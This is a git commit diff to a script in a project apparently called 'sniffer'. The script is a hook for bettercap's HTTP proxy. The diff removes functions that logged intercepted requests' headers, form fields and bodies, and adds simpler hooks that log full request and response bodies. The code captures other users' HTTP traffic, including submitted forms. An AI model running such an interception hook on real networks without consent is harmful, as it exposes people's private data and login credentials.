6c3881c1b43bc40ac463dbc51aa68af6776d1485
knoxknox <alexandr_y@mail.ru>
2018-05-12 23:51:22 +0300

    Change bcap script

--- sniffer/src/script.js
+++ sniffer/src/script.js
@@ -4,47 +4,10 @@
  * https://github.com/bettercap/bettercap/blob/master/modules/http_proxy_js_response.go#L14-L17
  */
 
-function logText(req) {
-  log('> Text');
-  log(req.ReadBody());
-}
-
-function logForm(req) {
-  log('> Form');
-  var form = req.ParseForm();
-  for (var key in form) {
-    log(key + ': ' + form[key]);
-  }
-}
-
-function logHeaders(req) {
-  log('> Headers');
-  var headers = req.Headers;
-  for (var i = 0; i < headers.length; i++) {
-    log(headers[i].Name + ': ' + headers[i].Value);
-  }
-}
-
-function logRequest(req) {
-  var query = req.Query ? '?' + req.Query : '';
-  var fullPath = req.Hostname + req.Path + query;
-  log(req.Client + ' > ' + req.Method + ' ' + fullPath);
-}
-
 function onRequest(req, res) {
-  logRequest(req);
-  logHeaders(req);
+  log_warn('Request: ' + req.ReadBody());
+}
 
-  if (req.ContentType.indexOf('text/plain') != -1) {
-    logText(req);
-  }
-  else if (req.ContentType.indexOf('application/json') != -1) {
-    logText(req);
-  }
-  else if (req.ContentType.indexOf('application/x-www-form-urlencoded') != -1) {
-    logForm(req);
-  }
-  else {
-    log(req.ReadBody());
-  }
+function onResponse(req, res) {
+  log_warn('Response: ' + res.Status + ', ' + res.ReadBody());
 }
